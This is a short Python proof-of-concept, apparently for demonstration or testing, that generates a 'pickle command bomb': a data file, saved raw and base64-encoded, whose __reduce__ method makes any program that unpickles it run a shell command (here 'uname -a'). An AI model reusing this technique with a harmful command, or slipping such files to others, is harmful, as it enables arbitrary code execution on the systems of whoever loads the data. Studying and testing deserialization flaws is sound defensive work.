# A simple pickle command bomb create program to craete a data file which 
# can run a command when the data file is deserialized.
# version v0.0.2
# by: Liu Yuancheng

import os
import pickle
import base64

cmdStr = ('uname -a')

class PickleCmd:
    def __reduce__(self):
        os.system('date')
        os.system('ifconfig')
        with open('testfile.txt', 'w') as fh:
            fh.write("Test file contents")
        cmd = ('uname -a')
        return os.system, (cmdStr,)
    
obj = PickleCmd()
pickledata = pickle.dumps(obj, protocol=pickle.HIGHEST_PROTOCOL)

with open('data.pkl', 'wb') as handle:
    pickle.dump(obj, handle, protocol=pickle.HIGHEST_PROTOCOL)

dataStr = base64.b64encode(pickledata).decode('ascii')
with open('data.txt', 'w') as fh:
    fh.write(dataStr)